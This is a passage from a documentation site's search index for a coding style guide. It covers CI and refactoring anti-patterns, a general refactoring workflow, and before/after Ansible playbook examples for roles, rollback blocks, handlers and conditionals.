Pipelines","text":"<p>Bad: 30+ minute pipelines discourage frequent commits</p> <pre><code>test:\n  script:\n    - run_all_tests.sh  # Takes 45 minutes\n</code></pre> <p>Good: Parallelize and optimize</p> <pre><code>unit-test:\n  script:\n    - npm run test:unit\n  parallel: 4\n\nintegration-test:\n  script:\n    - npm run test:integration\n  parallel: 2\n\ne2e-test:\n  script:\n    - npm run test:e2e\n  parallel: 2\n</code></pre> <p>Why: Fast pipelines enable rapid iteration and quick feedback</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#references","title":"References","text":"","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#official-documentation","title":"Official Documentation","text":"<ul> <li>Terraform Best Practices</li> <li>Ansible Best Practices</li> <li>Python Anti-Patterns</li> <li>TypeScript Do's and Don'ts</li> <li>Docker Best Practices</li> <li>GitHub Actions Best Practices</li> </ul>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#additional-resources","title":"Additional Resources","text":"<ul> <li>Code Smells Catalog</li> <li>Anti-Pattern Catalog</li> <li>Clean Code Principles</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"09_refactoring/","title":"Refactoring Examples","text":"<p>This directory contains real-world refactoring examples demonstrating how to improve code quality, maintainability, and adherence to the style guide principles. Each example shows before/after code with detailed explanations of the refactoring patterns applied.</p>","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#what-is-refactoring","title":"What is Refactoring?","text":"<p>Refactoring is the process of restructuring existing code without changing its external behavior. The goal is to improve:</p> <ul> <li>Readability: Make code easier to understand</li> <li>Maintainability: Reduce technical debt and complexity</li> <li>Performance: Optimize execution efficiency</li> <li>Testability: Make code easier to test</li> <li>Reusability: Extract common patterns</li> <li>Security: Remove vulnerabilities</li> </ul>","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#refactoring-vs-rewriting","title":"Refactoring vs. Rewriting","text":"Refactoring Rewriting Incremental changes Complete replacement Preserves functionality May change functionality Lower risk Higher risk Continuous improvement One-time effort Maintain tests Rebuild tests","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#when-to-refactor","title":"When to Refactor","text":"","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#good-times-to-refactor","title":"Good Times to Refactor","text":"<p>\u2705 During feature development - Boy Scout Rule (leave code better than you found it) \u2705 Before adding new features - Clean up the area you'll be working in \u2705 During code review - Address technical debt discovered \u2705 When fixing bugs - Improve code structure to prevent similar bugs \u2705 Regular maintenance - Scheduled refactoring sessions</p>","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#avoid-refactoring-when","title":"Avoid Refactoring When","text":"<p>\u274c Under tight deadlines - Unless refactoring makes the deadline easier to meet \u274c Broken code - Fix functionality first, then refactor \u274c No tests - Add tests before refactoring \u274c Unclear requirements - Clarify expectations first</p>","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#common-refactoring-patterns","title":"Common Refactoring Patterns","text":"","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#code-organization","title":"Code Organization","text":"<ul> <li>Extract Function: Break large functions into smaller, focused ones</li> <li>Extract Class: Move related functionality into a dedicated class</li> <li>Inline Function: Remove unnecessary abstraction layers</li> <li>Move Method: Relocate methods to more appropriate classes</li> </ul>","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#code-clarity","title":"Code Clarity","text":"<ul> <li>Rename: Use descriptive, meaningful names</li> <li>Replace Magic Numbers: Use named constants</li> <li>Simplify Conditionals: Reduce complexity of if/else logic</li> <li>Remove Dead Code: Delete unused code</li> </ul>","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#code-structure","title":"Code Structure","text":"<ul> <li>Replace Conditional with Polymorphism: Use inheritance instead of type checking</li> <li>Introduce Parameter Object: Group related parameters</li> <li>Preserve Whole Object: Pass objects instead of individual fields</li> <li>Replace Temp with Query: Replace temporary variables with method calls</li> </ul>","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#code-quality","title":"Code Quality","text":"<ul> <li>Decompose Conditional: Break complex conditionals into well-named functions</li> <li>Consolidate Duplicate Code: Apply DRY principle</li> <li>Simplify Method Chains: Reduce coupling and improve readability</li> <li>Replace Nested Conditional with Guard Clauses: Early returns for error cases</li> </ul>","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#refactoring-by-language","title":"Refactoring by Language","text":"<p>This directory includes language-specific refactoring examples:</p>","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#python-refactoring","title":"Python Refactoring","text":"<ul> <li>Extract function from long method</li> <li>Replace magic numbers with constants</li> <li>Simplify complex conditionals</li> <li>Use comprehensions effectively</li> <li>Apply type hints</li> </ul>","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#typescript-refactoring","title":"TypeScript Refactoring","text":"<ul> <li>Extract components from monolithic files</li> <li>Replace any with proper types</li> <li>Simplify async/await chains</li> <li>Use modern ES6+ features</li> <li>Apply functional programming patterns</li> </ul>","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#terraform-refactoring","title":"Terraform Refactoring","text":"<ul> <li>Extract reusable modules</li> <li>Simplify variable structures</li> <li>Use for_each instead of count</li> <li>Apply locals for DRY</li> <li>Improve resource naming</li> </ul>","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#ansible-refactoring","title":"Ansible Refactoring","text":"<ul> <li>Extract roles from playbooks</li> <li>Use blocks for error handling</li> <li>Apply handlers effectively</li> <li>Simplify conditionals</li> <li>Use collections</li> </ul>","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#bash-refactoring","title":"Bash Refactoring","text":"<ul> <li>Extract functions from scripts</li> <li>Add error handling</li> <li>Use arrays instead of strings</li> <li>Apply POSIX compliance</li> <li>Improve variable quoting</li> </ul>","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#refactoring-workflow","title":"Refactoring Workflow","text":"","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#1-ensure-tests-exist","title":"1. Ensure Tests Exist","text":"<pre><code>## Run existing tests before refactoring\npytest tests/\nnpm test\nterraform test\n</code></pre> <p>If no tests exist: Write tests first to ensure refactoring doesn't break functionality.</p>","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#2-make-small-incremental-changes","title":"2. Make Small, Incremental Changes","text":"<ul> <li>One refactoring at a time</li> <li>Commit after each successful refactoring</li> <li>Run tests after each change</li> </ul>","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#3-use-automated-tools","title":"3. Use Automated Tools","text":"<ul> <li>Python: <code>black</code>, <code>isort</code>, <code>pylint</code>, <code>mypy</code></li> <li>TypeScript: <code>prettier</code>, <code>eslint</code>, <code>tsc --strict</code></li> <li>Terraform: <code>terraform fmt</code>, <code>tflint</code>, <code>terrascan</code></li> <li>Ansible: <code>ansible-lint</code>, <code>yamllint</code></li> <li>Bash: <code>shellcheck</code>, <code>shfmt</code></li> </ul>","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#4-code-review","title":"4. Code Review","text":"<ul> <li>Peer review refactored code</li> <li>Ensure changes are understood</li> <li>Verify tests pass in CI/CD</li> </ul>","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#5-document-rationale","title":"5. Document Rationale","text":"<pre><code>## Good commit message\nrefactor: extract user validation into separate function\n\nMoved user input validation from main() into validate_user()\nto improve testability and reusability. Reduces main() function\ncomplexity from 150 to 80 lines.\n\nCloses #123\n</code></pre>","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#measuring-refactoring-success","title":"Measuring Refactoring Success","text":"","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#code-metrics","title":"Code Metrics","text":"<ul> <li>Cyclomatic Complexity: Lower is better (aim for &lt; 10 per function)</li> <li>Lines per Function: Smaller functions (aim for &lt; 50 lines)</li> <li>Code Duplication: Reduce duplicate code (aim for &lt; 5%)</li> <li>Test Coverage: Maintain or improve (aim for &gt; 80%)</li> </ul>","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#tools-for-measurement","title":"Tools for Measurement","text":"<ul> <li>Python: <code>radon</code>, <code>pylint</code>, <code>coverage</code></li> <li>TypeScript: <code>complexity-report</code>, <code>istanbul</code>, <code>sonarqube</code></li> <li>Terraform: <code>terraform validate</code>, <code>tflint</code></li> <li>General: <code>sonarqube</code>, <code>code-climate</code></li> </ul>","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#best-practices","title":"Best Practices","text":"<ol> <li>Test First: Always have tests before refactoring</li> <li>Small Steps: Make incremental changes</li> <li>Commit Often: Checkpoint after each successful refactoring</li> <li>Code Review: Get feedback on refactoring decisions</li> <li>Document Why: Explain the reasoning behind changes</li> <li>Measure Impact: Track improvements with metrics</li> <li>Avoid Scope Creep: Stick to one refactoring pattern at a time</li> <li>Preserve Behavior: Don't mix refactoring with feature changes</li> </ol>","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#anti-patterns-to-avoid","title":"Anti-Patterns to Avoid","text":"<p>\u274c Big Bang Refactoring: Rewriting large portions of code at once \u274c Refactoring Without Tests: Changing code without safety net \u274c Premature Optimization: Refactoring before understanding performance needs \u274c Over-Engineering: Adding unnecessary abstraction \u274c Mixing Concerns: Refactoring and adding features simultaneously \u274c Ignoring Style Guide: Refactoring without following project standards</p>","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#resources","title":"Resources","text":"","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#books","title":"Books","text":"<ul> <li>Refactoring: Improving the Design of Existing Code by Martin Fowler</li> <li>Clean Code by Robert C. Martin</li> <li>Working Effectively with Legacy Code by Michael Feathers</li> </ul>","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#online-resources","title":"Online Resources","text":"<ul> <li>Refactoring Guru - Refactoring patterns and examples</li> <li>Source Making - Design patterns and refactorings</li> <li>Code Smells - Identifying code that needs refactoring</li> </ul>","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/#related-documentation","title":"Related Documentation","text":"<ul> <li>Anti-Patterns - Common mistakes to avoid</li> <li>Language Guides - Language-specific best practices</li> <li>Examples - Complete project examples</li> <li>Testing Strategies - Testing approaches for refactored code</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-12-06 Maintainer: Tyler Dukes</p>","tags":["refactoring","code-improvement","best-practices","examples"]},{"location":"09_refactoring/ansible_refactoring/","title":"Ansible Refactoring Examples","text":"<p>Real-world examples of refactoring Ansible playbooks and roles to improve maintainability, reusability, and adherence to best practices.</p>","tags":["ansible","refactoring","best-practices","examples","automation"]},{"location":"09_refactoring/ansible_refactoring/#extract-roles-from-playbooks","title":"Extract Roles from Playbooks","text":"","tags":["ansible","refactoring","best-practices","examples","automation"]},{"location":"09_refactoring/ansible_refactoring/#problem-monolithic-playbook-doing-everything","title":"Problem: Monolithic playbook doing everything","text":"<p>Before (280-line playbook with everything inline):</p> <pre><code>---\n- name: Configure web servers\n  hosts: webservers\n  become: true\n  vars:\n    app_name: myapp\n    app_version: 1.0.0\n    app_port: 8080\n\n  tasks:\n    - name: Install system packages\n      apt:\n        name:\n          - nginx\n          - python3-pip\n          - git\n          - ufw\n        state: present\n        update_cache: yes\n\n    - name: Create application user\n      user:\n        name: \"{{ app_name }}\"\n        system: yes\n        shell: /bin/bash\n        home: \"/opt/{{ app_name }}\"\n\n    - name: Create application directories\n      file:\n        path: \"{{ item }}\"\n        state: directory\n        owner: \"{{ app_name }}\"\n        group: \"{{ app_name }}\"\n        mode: '0755'\n      loop:\n        - \"/opt/{{ app_name }}\"\n        - \"/opt/{{ app_name }}/releases\"\n        - \"/opt/{{ app_name }}/shared\"\n        - \"/var/log/{{ app_name }}\"\n\n    - name: Clone application repository\n      git:\n        repo: \"https://github.com/example/myapp.git\"\n        dest: \"/opt/{{ app_name }}/releases/{{ app_version }}\"\n        version: \"v{{ app_version }}\"\n      become_user: \"{{ app_name }}\"\n\n    - name: Install Python dependencies\n      pip:\n        requirements: \"/opt/{{ app_name }}/releases/{{ app_version }}/requirements.txt\"\n        virtualenv: \"/opt/{{ app_name }}/venv\"\n      become_user: \"{{ app_name }}\"\n\n    - name: Copy application config\n      template:\n        src: app_config.j2\n        dest: \"/opt/{{ app_name }}/shared/config.yaml\"\n        owner: \"{{ app_name }}\"\n        group: \"{{ app_name }}\"\n        mode: '0640'\n\n    - name: Create systemd service file\n      template:\n        src: systemd_service.j2\n        dest: \"/etc/systemd/system/{{ app_name }}.service\"\n        mode: '0644'\n      notify: reload systemd\n\n    - name: Configure nginx\n      template:\n        src: nginx_config.j2\n        dest: \"/etc/nginx/sites-available/{{ app_name }}\"\n        mode: '0644'\n      notify: restart nginx\n\n    - name: Enable nginx site\n      file:\n        src: \"/etc/nginx/sites-available/{{ app_name }}\"\n        dest: \"/etc/nginx/sites-enabled/{{ app_name }}\"\n        state: link\n      notify: restart nginx\n\n    - name: Configure firewall\n      ufw:\n        rule: allow\n        port: \"{{ item }}\"\n        proto: tcp\n      loop:\n        - \"80\"\n        - \"443\"\n        - \"{{ app_port }}\"\n\n    - name: Enable firewall\n      ufw:\n        state: enabled\n\n    # ... 100+ more lines of tasks ...\n\n  handlers:\n    - name: reload systemd\n      systemd:\n        daemon_reload: yes\n\n    - name: restart nginx\n      service:\n        name: nginx\n        state: restarted\n\n    - name: restart application\n      service:\n        name: \"{{ app_name }}\"\n        state: restarted\n</code></pre> <p>After (modular role-based structure):</p> <pre><code>## playbooks/configure_webservers.yml (now 20 lines)\n---\n- name: Configure web servers\n  hosts: webservers\n  become: true\n\n  roles:\n    - role: common\n      tags: common\n\n    - role: nginx\n      tags: nginx\n\n    - role: application\n      vars:\n        app_name: myapp\n        app_version: 1.0.0\n        app_port: 8080\n        app_repo: \"https://github.com/example/myapp.git\"\n      tags: application\n\n    - role: firewall\n      vars:\n        firewall_allowed_ports:\n          - { port: 80, proto: tcp }\n          - { port: 443, proto: tcp }\n          - { port: 8080, proto: tcp }\n      tags: firewall\n\n## roles/common/tasks/main.yml\n---\n- name: Install system packages\n  apt:\n    name: \"{{ common_packages }}\"\n    state: present\n    update_cache: yes\n    cache_valid_time: 3600\n\n- name: Configure timezone\n  timezone:\n    name: \"{{ system_timezone }}\"\n\n- name: Set hostname\n  hostname:\n    name: \"{{ inventory_hostname }}\"\n\n## roles/common/defaults/main.yml\n---\ncommon_packages:\n  - curl\n  - git\n  - vim\n  - ufw\n  - python3-pip\n\nsystem_timezone: \"UTC\"\n\n## roles/application/tasks/main.yml\n---\n- name: Include user setup\n  import_tasks: user.yml\n\n- name: Include directory setup\n  import_tasks: directories.yml\n\n- name: Include deployment tasks\n  import_tasks: deploy.yml\n\n- name: Include service configuration\n  import_tasks: service.yml\n\n## roles/application/tasks/user.yml\n---\n- name: Create application user\n  user:\n    name: \"{{ app_name }}\"\n    system: yes\n    shell: /bin/bash\n    home: \"{{ app_home }}\"\n    create_home: yes\n\n## roles/application/tasks/directories.yml\n---\n- name: Create application directories\n  file:\n    path: \"{{ item }}\"\n    state: directory\n    owner: \"{{ app_name }}\"\n    group: \"{{ app_name }}\"\n    mode: '0755'\n  loop: \"{{ app_directories }}\"\n\n## roles/application/tasks/deploy.yml\n---\n- name: Clone application repository\n  git:\n    repo: \"{{ app_repo }}\"\n    dest: \"{{ app_release_path }}\"\n    version: \"v{{ app_version }}\"\n  become_user: \"{{ app_name }}\"\n  notify: restart application\n\n- name: Install Python dependencies\n  pip:\n    requirements: \"{{ app_release_path }}/requirements.txt\"\n    virtualenv: \"{{ app_venv_path }}\"\n  become_user: \"{{ app_name }}\"\n\n- name: Copy application config\n  template:\n    src: config.yaml.j2\n    dest: \"{{ app_shared_path }}/config.yaml\"\n    owner: \"{{ app_name }}\"\n    group: \"{{ app_name }}\"\n    mode: '0640'\n  notify: restart application\n\n## roles/application/tasks/service.yml\n---\n- name: Create systemd service file\n  template:\n    src: systemd.service.j2\n    dest: \"/etc/systemd/system/{{ app_name }}.service\"\n    mode: '0644'\n  notify:\n    - reload systemd\n    - restart application\n\n- name: Enable and start application service\n  service:\n    name: \"{{ app_name }}\"\n    enabled: yes\n    state: started\n\n## roles/application/defaults/main.yml\n---\napp_home: \"/opt/{{ app_name }}\"\napp_release_path: \"{{ app_home }}/releases/{{ app_version }}\"\napp_shared_path: \"{{ app_home }}/shared\"\napp_venv_path: \"{{ app_home }}/venv\"\n\napp_directories:\n  - \"{{ app_home }}\"\n  - \"{{ app_home }}/releases\"\n  - \"{{ app_home }}/shared\"\n  - \"/var/log/{{ app_name }}\"\n\n## roles/application/handlers/main.yml\n---\n- name: reload systemd\n  systemd:\n    daemon_reload: yes\n\n- name: restart application\n  service:\n    name: \"{{ app_name }}\"\n    state: restarted\n\n## roles/nginx/tasks/main.yml\n---\n- name: Install nginx\n  apt:\n    name: nginx\n    state: present\n\n- name: Configure nginx site\n  template:\n    src: site.conf.j2\n    dest: \"/etc/nginx/sites-available/{{ nginx_site_name }}\"\n    mode: '0644'\n  notify: restart nginx\n\n- name: Enable nginx site\n  file:\n    src: \"/etc/nginx/sites-available/{{ nginx_site_name }}\"\n    dest: \"/etc/nginx/sites-enabled/{{ nginx_site_name }}\"\n    state: link\n  notify: restart nginx\n\n- name: Start and enable nginx\n  service:\n    name: nginx\n    enabled: yes\n    state: started\n\n## roles/firewall/tasks/main.yml\n---\n- name: Configure firewall rules\n  ufw:\n    rule: \"{{ item.rule | default('allow') }}\"\n    port: \"{{ item.port }}\"\n    proto: \"{{ item.proto }}\"\n  loop: \"{{ firewall_allowed_ports }}\"\n\n- name: Enable firewall\n  ufw:\n    state: enabled\n</code></pre> <p>Improvements:</p> <ul> <li>\u2705 Modular structure with reusable roles</li> <li>\u2705 Each role has single responsibility</li> <li>\u2705 Roles can be tested independently</li> <li>\u2705 Easy to reuse across different playbooks</li> <li>\u2705 Clear separation of concerns</li> <li>\u2705 Playbook is now 20 lines instead of 280</li> </ul>","tags":["ansible","refactoring","best-practices","examples","automation"]},{"location":"09_refactoring/ansible_refactoring/#use-blocks-for-error-handling","title":"Use Blocks for Error Handling","text":"","tags":["ansible","refactoring","best-practices","examples","automation"]},{"location":"09_refactoring/ansible_refactoring/#problem-no-error-handling-tasks-fail-and-leave-system-in-inconsistent-state","title":"Problem: No error handling, tasks fail and leave system in inconsistent state","text":"<p>Before:</p> <pre><code>---\n- name: Deploy application\n  hosts: webservers\n  become: true\n\n  tasks:\n    - name: Stop application service\n      service:\n        name: myapp\n        state: stopped\n\n    - name: Backup current version\n      archive:\n        path: /opt/myapp/current\n        dest: /opt/myapp/backups/backup-{{ ansible_date_time.epoch }}.tar.gz\n\n    - name: Download new version\n      get_url:\n        url: \"https://releases.example.com/myapp/v2.0.0.tar.gz\"\n        dest: /tmp/myapp-v2.0.0.tar.gz\n\n    - name: Extract new version\n      unarchive:\n        src: /tmp/myapp-v2.0.0.tar.gz\n        dest: /opt/myapp/current\n        remote_src: yes\n\n    - name: Run database migrations\n      command: /opt/myapp/current/bin/migrate\n      # If this fails, app is stopped and new version is broken!\n\n    - name: Start application service\n      service:\n        name: myapp\n        state: started\n      # This never runs if migration fails\n</code></pre> <p>After:</p> <pre><code>---\n- name: Deploy application\n  hosts: webservers\n  become: true\n\n  tasks:\n    - name: Deploy application with rollback on failure\n      block:\n        - name: Stop application service\n          service:\n            name: myapp\n            state: stopped\n\n        - name: Backup current version\n          archive:\n            path: /opt/myapp/current\n            dest: /opt/myapp/backups/backup-{{ ansible_date_time.epoch }}.tar.gz\n          register: backup_result\n\n        - name: Download new version\n          get_url:\n            url: \"{{ app_release_url }}\"\n            dest: \"/tmp/{{ app_package_name }}\"\n            checksum: \"{{ app_checksum }}\"\n          register: download_result\n\n        - name: Create staging directory\n          file:\n            path: /opt/myapp/staging\n            state: directory\n            mode: '0755'\n\n        - name: Extract new version to staging\n          unarchive:\n            src: \"/tmp/{{ app_package_name }}\"\n            dest: /opt/myapp/staging\n            remote_src: yes\n\n        - name: Run database migrations\n          command: /opt/myapp/staging/bin/migrate\n          environment:\n            DATABASE_URL: \"{{ database_url }}\"\n          register: migration_result\n          changed_when: \"'Applied' in migration_result.stdout\"\n\n        - name: Smoke test new version\n          uri:\n            url: \"http://localhost:8080/health\"\n            status_code: 200\n          register: health_check\n          retries: 3\n          delay: 5\n\n        - name: Replace current with new version\n          shell: |\n            rm -rf /opt/myapp/current\n            mv /opt/myapp/staging /opt/myapp/current\n          args:\n            warn: false\n\n        - name: Start application service\n          service:\n            name: myapp\n            state: started\n\n        - name: Wait for application to be ready\n          uri:\n            url: \"http://localhost:8080/health\"\n            status_code: 200\n          register: final_health_check\n          until: final_health_check.status == 200\n          retries: 10\n          delay: 5\n\n      rescue:\n        - name: Log deployment failure\n          debug:\n            msg: \"Deployment failed. Rolling back to previous version.\"\n\n        - name: Stop failed application\n          service:\n            name: myapp\n            state: stopped\n          ignore_errors: yes\n\n        - name: Restore backup\n          unarchive:\n            src: \"{{ backup_result.dest }}\"\n            dest: /opt/myapp/current\n            remote_src: yes\n          when: backup_result is defined and backup_result.dest is defined\n\n        - name: Rollback database migrations\n          command: /opt/myapp/current/bin/migrate rollback\n          environment:\n            DATABASE_URL: \"{{ database_url }}\"\n          ignore_errors: yes\n\n        - name: Start application service (previous version)\n          service:\n            name: myapp\n            state: started\n\n        - name: Verify rollback succeeded\n          uri:\n            url: \"http://localhost:8080/health\"\n            status_code: 200\n          register: rollback_health_check\n          retries: 5\n          delay: 5\n\n        - name: Fail with clear error message\n          fail:\n            msg: |\n              Deployment failed and rolled back to previous version.\n              Error: {{ ansible_failed_result.msg | default('Unknown error') }}\n\n      always:\n        - name: Clean up temporary files\n          file:\n            path: \"{{ item }}\"\n            state: absent\n          loop:\n            - \"/tmp/{{ app_package_name }}\"\n            - /opt/myapp/staging\n          ignore_errors: yes\n\n        - name: Send deployment notification\n          uri:\n            url: \"{{ slack_webhook_url }}\"\n            method: POST\n            body_format: json\n            body:\n              text: |\n                Deployment {{ 'succeeded' if ansible_failed_task is not defined else 'failed' }}\n                Host: {{ inventory_hostname }}\n                Version: {{ app_version }}\n          when: slack_webhook_url is defined\n          delegate_to: localhost\n</code></pre> <p>Improvements:</p> <ul> <li>\u2705 Automatic rollback on failure</li> <li>\u2705 Database migrations are reversible</li> <li>\u2705 Cleanup happens regardless of success/failure</li> <li>\u2705 Clear error messages</li> <li>\u2705 Notifications sent for all outcomes</li> <li>\u2705 System never left in inconsistent state</li> </ul>","tags":["ansible","refactoring","best-practices","examples","automation"]},{"location":"09_refactoring/ansible_refactoring/#apply-handlers-effectively","title":"Apply Handlers Effectively","text":"","tags":["ansible","refactoring","best-practices","examples","automation"]},{"location":"09_refactoring/ansible_refactoring/#problem-tasks-restart-services-multiple-times-unnecessarily","title":"Problem: Tasks restart services multiple times unnecessarily","text":"<p>Before:</p> <pre><code>---\n- name: Configure web server\n  hosts: webservers\n  become: true\n\n  tasks:\n    - name: Update nginx config\n      template:\n        src: nginx.conf.j2\n        dest: /etc/nginx/nginx.conf\n        mode: '0644'\n\n    - name: Restart nginx\n      service:\n        name: nginx\n        state: restarted\n\n    - name: Update site config\n      template:\n        src: site.conf.j2\n        dest: /etc/nginx/sites-available/mysite\n        mode: '0644'\n\n    - name: Restart nginx again\n      service:\n        name: nginx\n        state: restarted\n\n    - name: Copy SSL certificate\n      copy:\n        src: \"{{ item }}\"\n        dest: /etc/nginx/ssl/\n        mode: '0600'\n      loop:\n        - cert.pem\n        - key.pem\n\n    - name: Restart nginx yet again\n      service:\n        name: nginx\n        state: restarted\n    # Nginx restarted 3 times when once at the end would suffice!\n</code></pre> <p>After:</p> <pre><code>---\n- name: Configure web server\n  hosts: webservers\n  become: true\n\n  tasks:\n    - name: Update nginx config\n      template:\n        src: nginx.conf.j2\n        dest: /etc/nginx/nginx.conf\n        mode: '0644'\n        validate: 'nginx -t -c %s'\n      notify: reload nginx\n\n    - name: Update site config\n      template:\n        src: site.conf.j2\n        dest: /etc/nginx/sites-available/mysite\n        mode: '0644'\n      notify: reload nginx\n\n    - name: Enable site\n      file:\n        src: /etc/nginx/sites-available/mysite\n        dest: /etc/nginx/sites-enabled/mysite\n        state: link\n      notify: reload nginx\n\n    - name: Copy SSL certificate\n      copy:\n        src: cert.pem\n        dest: /etc/nginx/ssl/cert.pem\n        mode: '0600'\n      notify: reload nginx\n\n    - name: Copy SSL private key\n      copy:\n        src: key.pem\n        dest: /etc/nginx/ssl/key.pem\n        mode: '0600'\n      notify: reload nginx\n\n    # Nginx will only reload once at the end, after all tasks complete\n\n  handlers:\n    - name: reload nginx\n      service:\n        name: nginx\n        state: reloaded\n      # Use reload instead of restart for zero-downtime\n\n    - name: restart nginx\n      service:\n        name: nginx\n        state: restarted\n      # Keep restart handler for when reload isn't enough\n\n    - name: validate nginx config\n      command: nginx -t\n      changed_when: false\n      # Validation handler for manual triggering\n</code></pre> <p>Even Better (with handler dependencies):</p> <pre><code>---\n- name: Configure web server with handler dependencies\n  hosts: webservers\n  become: true\n\n  tasks:\n    - name: Update nginx config\n      template:\n        src: nginx.conf.j2\n        dest: /etc/nginx/nginx.conf\n        mode: '0644'\n      notify: validate and reload nginx\n\n    - name: Update site config\n      template:\n        src: site.conf.j2\n        dest: /etc/nginx/sites-available/mysite\n        mode: '0644'\n      notify: validate and reload nginx\n\n    - name: Update SSL configuration\n      template:\n        src: ssl.conf.j2\n        dest: /etc/nginx/conf.d/ssl.conf\n        mode: '0644'\n      notify: validate and reload nginx\n\n  handlers:\n    - name: validate and reload nginx\n      listen: \"validate and reload nginx\"\n      block:\n        - name: Validate nginx configuration\n          command: nginx -t\n          changed_when: false\n\n        - name: Reload nginx\n          service:\n            name: nginx\n            state: reloaded\n\n      rescue:\n        - name: Log validation failure\n          debug:\n            msg: \"Nginx configuration validation failed. Not reloading.\"\n\n        - name: Restore previous configuration\n          command: cp /etc/nginx/nginx.conf.backup /etc/nginx/nginx.conf\n          when: nginx_backup_exists\n\n        - name: Fail with error\n          fail:\n            msg: \"Nginx configuration is invalid. Check your templates.\"\n</code></pre> <p>Improvements:</p> <ul> <li>\u2705 Service reloaded once instead of multiple times</li> <li>\u2705 Use reload instead of restart (zero-downtime)</li> <li>\u2705 Configuration validated before reload</li> <li>\u2705 Handler runs only if notified</li> <li>\u2705 Handler runs at end of play (all changes applied at once)</li> <li>\u2705 Automatic rollback if validation fails</li> </ul>","tags":["ansible","refactoring","best-practices","examples","automation"]},{"location":"09_refactoring/ansible_refactoring/#simplify-conditionals","title":"Simplify Conditionals","text":"","tags":["ansible","refactoring","best-practices","examples","automation"]},{"location":"09_refactoring/ansible_refactoring/#problem-complex-when-conditions-repeated-across-tasks","title":"Problem: Complex when conditions repeated across tasks","text":"<p>Before:</p> <pre><code>---\n- name: Configure application\n  hosts: all\n  become: true\n\n  tasks:\n    - name: Install package for production Ubuntu\n      apt:\n        name: myapp-pro\n        state: present\n      when:\n        - environment == \"production\"\n        - ansible_distribution == \"Ubuntu\"\n        - ansible_distribution_major_version|int &gt;= 20\n\n    - name: Install package for production CentOS\n      yum:\n        name: myapp-pro\n        state: present\n      when:\n        - environment == \"production\"\n        - ansible_distribution == \"CentOS\"\n        - ansible_distribution_major_version|int &gt;= 8\n\n    - name: Install package for staging Ubuntu\n      apt:\n        name: myapp-staging\n        state: present\n      when:\n        - environment == \"staging\"\n        - ansible_distribution == \"Ubuntu\"\n        - ansible_distribution_major_version|int &gt;= 20\n\n    - name: Configure production database for Ubuntu\n      template:\n        src: db_config_prod.j2\n        dest: /etc/myapp/database.yml\n      when:\n        - environment == \"production\"\n        - ansible_distribution == \"Ubuntu\"\n        - ansible_distribution_major_version|int &gt;= 20\n\n    # Repeated conditionals throughout...\n</code></pre> <p>After (using includes and group_vars):</p> <pre><code>## group_vars/production.yml\n---\nenvironment: production\napp_package: myapp-pro\ndb_config_template: db_config_prod.j2\nlog_level: info\nenable_monitoring: true\n\n## group_vars/staging.yml\n---\nenvironment: staging\napp_package: myapp-staging\ndb_config_template: db_config_staging.j2\nlog_level: debug\nenable_monitoring: false\n\n## playbook.yml\n---\n- name: Configure application\n  hosts: all\n  become: true\n\n  tasks:\n    - name: Include OS-specific variables\n      include_vars: \"{{ item }}\"\n      with_first_found:\n        - \"{{ ansible_distribution }}-{{ ansible_distribution_major_version }}.yml\"\n        - \"{{ ansible_distribution }}.yml\"\n        - \"default.yml\"\n\n    - name: Include OS-specific tasks\n      include_tasks: \"{{ ansible_os_family | lower }}.yml\"\n\n## tasks/debian.yml (for Ubuntu/Debian)\n---\n- name: Install application package (Debian)\n  apt:\n    name: \"{{ app_package }}\"\n    state: present\n    update_cache: yes\n  when: ansible_distribution_major_version|int &gt;= 20\n\n- name: Configure database (Debian)\n  template:\n    src: \"{{ db_config_template }}\"\n    dest: /etc/myapp/database.yml\n    mode: '0640'\n\n## tasks/redhat.yml (for CentOS/RHEL)\n---\n- name: Install application package (RedHat)\n  yum:\n    name: \"{{ app_package }}\"\n    state: present\n  when: ansible_distribution_major_version|int &gt;= 8\n\n- name: Configure database (RedHat)\n  template:\n    src: \"{{ db_config_template }}\"\n    dest: /etc/myapp/database.yml\n    mode: '0640'\n</code></pre> 